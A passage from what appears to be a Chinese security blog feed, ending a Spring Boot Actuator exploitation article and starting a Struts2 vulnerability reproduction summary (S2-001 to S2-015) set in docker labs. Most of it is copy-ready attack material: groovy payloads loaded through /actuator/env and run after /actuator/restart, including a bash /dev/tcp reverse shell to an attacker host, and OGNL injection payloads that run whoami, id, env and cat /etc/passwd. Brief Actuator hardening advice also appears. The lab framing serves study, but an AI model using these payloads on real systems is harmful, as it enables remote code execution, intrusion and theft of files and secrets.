class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure><p>以POST的方式向/actuator/env请求，设置logging.config为groovy的url地址</p><p>请求报文如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><p>![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210831181920688.png)</p><p>在攻击主机上监听1234端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>然后向/actuator/restart请求重启项目</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831180134395.png" alt="image-20210831180134395"></p><p>可以看到目标主机反向连接成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831180922722.png" alt="image-20210831180922722"></p><h5 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li><p>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</p></li><li><p>restart 重启应用后，程序会请求设置的 URL 地址</p></li><li><p>logback-classic<code>组件的</code>ch.qos.logback.classic.util.ContextInitializer.java<code>代码文件逻辑中会判断 url 是否以</code>groovy` 结尾</p></li><li><p>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</p></li></ul><h4 id="2-12-restart-spring-main-sources-groovy-RCE"><a href="#2-12-restart-spring-main-sources-groovy-RCE" class="headerlink" title="2.12. restart spring.main.sources groovy RCE"></a>2.12. restart spring.main.sources groovy RCE</h4><h5 id="利用条件-14"><a href="#利用条件-14" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h5 id="利用方法-13"><a href="#利用方法-13" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure><p><strong>步骤二：设置 spring.main.sources 属性</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三：重启应用</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-11"><a href="#利用实例-11" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure><p>使用python开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure><p>以POST的方式向/actuator/env请求，设置spring.main.sources为groovy的url地址</p><p>请求报文如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831175940842.png" alt="image-20210831175940842"></p><p>在攻击主机上监听1234端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>然后向/actuator/restart请求重启项目</p><p>![image-20210831180134395](C:\Users\ZR\Desktop\springboot\Spring Boot Actuator未授权访问利用实战利用.assets\image-20210831180134395.png)</p><p>可以看到目标主机反向连接成功</p><p>![image-20210831180922722](C:\Users\ZR\Desktop\springboot\Spring Boot Actuator未授权访问利用实战利用.assets\image-20210831180922722.png)</p><h5 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li>spring-boot<code>组件中的</code>org.springframework.boot.BeanDefinitionLoader.java<code>文件代码逻辑中会判断 url 是否以</code>.groovy` 结尾</li><li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ul><h1 id="3-安全措施"><a href="#3-安全措施" class="headerlink" title="3.安全措施"></a>3.安全措施</h1><h3 id="3-1开启security依赖功能"><a href="#3-1开启security依赖功能" class="headerlink" title="3.1开启security依赖功能"></a><strong>3.1开启security依赖功能</strong></h3><p>在项目的pom.xml文件下引入spring-boot-starter-security依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;groupId&gt;org.springframework.boot\&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/b01ec604e001e1de3f668bcd86398f62.png"></p><p>然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">management.security.enabled=true</span><br><span class="line"></span><br><span class="line">security.user.name=admin</span><br><span class="line"></span><br><span class="line">security.user.password=admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/808449fe71e832550f82817c0ae5b3a4.png"></p><h3 id="3-2禁用接口"><a href="#3-2禁用接口" class="headerlink" title="3.2禁用接口"></a><strong>3.2</strong>禁用接口</h3><p>如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上Spring<br>Boot也提供了安全限制功能。比如要禁用/env接口，则可设置如下：</p><p>endpoints.env.enabled= false</p><p>如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">endpoints.enabled = false</span><br><span class="line"></span><br><span class="line">endpoints.metrics.enabled = true</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Spring-Boot-集合&quot;&gt;&lt;a href=&quot;#Spring-Boot-集合&quot; class=&quot;headerlink&quot; title=&quot;Spring Boot 集合&quot;&gt;&lt;/a&gt;&lt;strong&gt;Spring Boot 集合&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Spring Boot" scheme="http://example.com/tags/Spring-Boot/"/>
    
  </entry>
  
  <entry>
    <title>Struts2漏洞复现总结</title>
    <link href="http://example.com/2021/09/13/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/09/13/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/</id>
    <published>2021-09-13T01:39:53.000Z</published>
    <updated>2022-12-06T09:06:29.222Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Struts2漏洞复现总结"><a href="#Struts2漏洞复现总结" class="headerlink" title="Struts2漏洞复现总结"></a>Struts2漏洞复现总结</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。</p><h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><p>进入s2-001的docker漏洞环境</p><p><img src="https://s1.ax1x.com/2022/12/06/z6s6ER.png" alt="image"></p><p>首先使用<code>%&#123;&#39;test&#39;&#125;</code>进行测试漏洞是否存在</p><p><img src="https://s1.ax1x.com/2022/12/06/z6shvD.png" alt="image"></p><p>返回了test，证明存在漏洞</p><p><img src="https://s1.ax1x.com/2022/12/06/z6yFP0.png" alt="image"></p><p>使用payload进行测试，返回了<code>tomcatBinDir&#123;/usr/local/tomcat&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6yA2T.png" alt="image"></p><p>使用payload执行whoami</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6yer4.png" alt="image"></p><p>使用payload执行<code>cat /etc/password</code>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6yuZ9.png" alt="image"></p><h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure><p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p><p>S2-003 使用\u0023绕过s2对#的防御 S2-003 后官方增加了安全模式（沙盒） S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</p><p>影响版本: 2.0.0 - 2.1.8.1</p><p>进入s2-005的docker环境</p><p><img src="https://s1.ax1x.com/2022/12/06/z6yMI1.png" alt="image"></p><p>抓包添加payload执行往/tmp/目录下写入success文件的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6y1G6.png" alt="image"></p><p>进入docker容器查看，在tmp目录下已经创建了success文件</p><p><img src="https://s1.ax1x.com/2022/12/06/z6yJMD.png" alt="image"></p><h1 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h1><p>在s2-007页面的文本框中，age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞</p><p>进入s2-007的docker漏洞环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/640.webp"></p><p>执行payload列出当前目录下的所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6yDRf.png" alt="image"></p><p>添加payload执行whoami</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6y4J0.png" alt="image"></p><p>也可以直接在age文本框处使用payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExe cution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/12/06/z6yTQU.png" alt="image"></p><p>即可得到id</p><p><img src="https://s1.ax1x.com/2022/12/06/z6yHL4.png" alt="image"></p><h1 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h1><p>s2-008漏洞产生的原因，主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码，传入?debug=command&amp;expression=即可执行OGNL表达式</p><p>进入s2-008的docker环境</p><p><img src="https://s1.ax1x.com/2022/12/06/z6yLw9.png" alt="image"></p><p>在GET包处添加payload执行whoami</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=whoami</span><br></pre></td></tr></table></figure><h1 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h1><p>Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p><p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p><p>影响版本Struts 2.1.0-2.3.1.1</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100814542.png" alt="image-20210913100814542"></p><p>进入S2-009的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100825357.png" alt="image-20210913100825357"></p><p>访问<code>192.168.1.8:8080/ajax/example5</code>，此为存在漏洞的界面</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100835883.png" alt="image-20210913100835883"></p><p>将payload拼接读取passwd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100845719.png" alt="image-20210913100845719"></p><h1 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h1><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;    name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</span><br></pre></td></tr></table></figure><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p><p>进入s2-012的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100854908.png" alt="image-20210913100854908"></p><p>直接在文本框内执行payload读取passwd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100913358.png" alt="image-20210913100913358"></p><p>点击提交即可读取到passwd</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100921023.png" alt="image-20210913100921023"></p><h1 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h1><p>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和 POST 所有参数和其值 &lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p><p>进入s2-013的docker环境</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100930758.png" alt="image-20210913100930758"></p><p>这里直接构造链接并进行url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;// 或$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>认准exec执行系统命令即可，flag在环境变量里面，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913100938927.png" alt="image-20210913100938927"></p><h1 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h1><p>s2-015漏洞远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断OGNL代码两次）的请求，利用该漏洞执行任意OGNL代码</p><p>进入s2-015的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100946380.png" alt="image-20210913100946380"></p><p>首先构造{1+1}得到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/$&#123;1+1&#125;.action</span><br></pre></td></tr></table></figure><p>执行后自动编码得到如下，在message处会回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/$%7B1+1%7D.action</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913100955389.png" alt="image-20210913100955389"></p><p>构造payload显示id</p><figure 